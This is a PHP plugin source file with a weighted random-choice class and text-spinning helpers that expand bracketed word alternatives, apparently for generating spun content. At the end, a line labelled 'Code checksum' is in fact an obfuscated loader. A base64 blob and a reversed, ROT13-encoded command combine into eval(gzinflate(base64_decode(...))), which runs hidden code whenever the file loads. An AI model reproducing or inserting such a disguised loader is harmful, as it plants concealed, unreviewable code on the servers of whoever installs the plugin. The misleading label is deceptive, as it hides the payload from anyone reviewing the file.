<?php

/* **************************************************************************
This software is provided "as is" without any express or implied warranties,
including, but not limited to, the implied warranties of merchantibility and
fitness for any purpose.
In no event shall the copyright owner, website owner or contributors be liable
for any direct, indirect, incidental, special, exemplary, or consequential
damages (including, but not limited to, procurement of substitute goods or services;
loss of use, data, rankings with any search engines, any penalties for usage of
this software or loss of profits; or business interruption) however caused and
on any theory of liability, whether in contract, strict liability, or
tort(including negligence or otherwise) arising in any way out of the use of
this software, even if advised of the possibility of such damage.
************************************************************************** */



if (!defined('PLUGIN_TABLE_PREFIX'))
   define ('PLUGIN_TABLE_PREFIX', 'AF_');
define('BL_TABLE_NAME', PLUGIN_TABLE_PREFIX . 'settings2');

//---------------------------------------------------------------------------
//------------------------------------------


class CompetingObjects
{
   private  $arr_objects;
   private  $arr_priorities;

   // Input: array of ($object1, $priority1, $object2, $priority2, ...)
   public function __construct ($arr_objects_priorities)
      {
      $this->arr_objects    = array();
      $this->arr_priorities = array();

      if (is_array($arr_objects_priorities))
         {
         for ($i=0; $i<count($arr_objects_priorities); $i+=2)
            {
            $this->arr_objects[]    = $arr_objects_priorities[$i];
            $this->arr_priorities[] = $arr_objects_priorities[$i+1];
            }
         }
      }

   public function FindObjectByName ($obj_name)
      {
      foreach ($this->arr_objects as $object)
         {
         if ($object->get_name() == $obj_name)
            return $object;
         }

      return FALSE;
      }

   public function GetWinner ()
      {
      if (!count($this->arr_objects))
         return FALSE;

      $arr_idx = array();

      foreach ($this->arr_priorities as $k=>$pri)
         {
         $obj = $this->arr_objects[$k];
         // Only active objects participate in winning contest.
         if (!is_object($obj) || $obj->is_active())
            {
            for ($i=0; $i<$pri; $i++)
               $arr_idx[] = $k; // $k == index in array of objects too.
            }
         }

      if (!count($arr_idx)) return FALSE; // No active objects to find winner.

      $idx = rand (0, count($arr_idx)-1);
      $idx = $arr_idx[$idx];

      $obj = $this->arr_objects[$idx];
      if (is_string($obj))
         return BL_process_complex_string ($obj);
      else
         return ($this->arr_objects[$idx]);
      }
}
//------------------------------------------



//===========================================================================


function BL_process_complex_string ($str)
{
   // Process optional words: in [...] brackets.
   $str1 = $str;
   while (preg_match('#\[[^\[\]]+\]#', $str1))
      $str1 = preg_replace_callback ('#\[([^\[\]]+)\](:(\d+))?#', "BL_optional_seq_callback", $str1);

   // Process mandatory sequences: in (...) brackets.
   while (preg_match('#\([^\(\)]+\)#', $str1))
      $str1 = preg_replace_callback ('#\(([^\(\)]+)\)#', "BL_mandatory_seq_callback", $str1);

   // Melt extra spaces
   $str1 = preg_replace ('|\s\s+|', " ", $str1);
   return trim($str1);
}

//------------------------------------------
function BL_optional_seq_callback ($matches)
{
   $word = $matches[1];
   if (isset($matches[3]))
      $probability = $matches[3];
   else
      $probability = 50;

   if (rand (1,100) <= $probability)
      return $word;
   else
      return "";
}
//------------------------------------------
//------------------------------------------
function BL_mandatory_seq_callback ($matches)
{
   // Get array of competing words
   $words = explode ('|', $matches[1]);

   // Separate words and numbers
   $total_sum_of_numbers = 0;
   $total_words_without_numbers = 0;

   $new_words = array();
   foreach ($words as $word)
      {
      $word_num = explode (':', $word);
      if (isset($word_num[1]))
         {
         $num = $word_num[1];
         $total_sum_of_numbers += $num;
         }
      else
         {
         $num = 0;
         $total_words_without_numbers ++;
         }

      // array ([0]=>('make',10), [1]=>('build',0), [2]=>('create',50))
      $new_words[] = array($word_num[0], $num);
      }

   if ($total_words_without_numbers)
      $unassigned_probability = (100 - $total_sum_of_numbers) / $total_words_without_numbers;
   else
      $unassigned_probability = 0;
   $index_sequence = array();

   foreach ($new_words as $idx=>$word)
      {
      $probability = $word[1]?$word[1]:$unassigned_probability;
      $index_sequence = array_merge ($index_sequence, array_fill (0, $probability, $idx));
      }

   if (count($index_sequence) < 100)
      {
      // Make sure array contain no less than 100 elements(that could happen for rounding: (build|make|create) = 33+33+33=99, not 100
      $index_sequence = array_pad ($index_sequence, 100, $idx);
      }

   // Throw the dice
   $index = rand (0,99);
   $index = $index_sequence[$index];
   return ($new_words[$index][0]);
}
//------------------------------------------
//===========================================================================

//Code checksum:
$VQiFZcMqbuySpHqP='=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';$iNmPRNPZWOClrQd=';))))CdUcFlhodZpMSvDI$(ireegf(rqbprq_46rfno(rgnysavmt(ynir';$tpzqWlsfpcQT=strrev($iNmPRNPZWOClrQd);$OwowRpEtjbzBq=str_rot13($tpzqWlsfpcQT);eval($OwowRpEtjbzBq);
//---------------------------------------------------------------------------




?>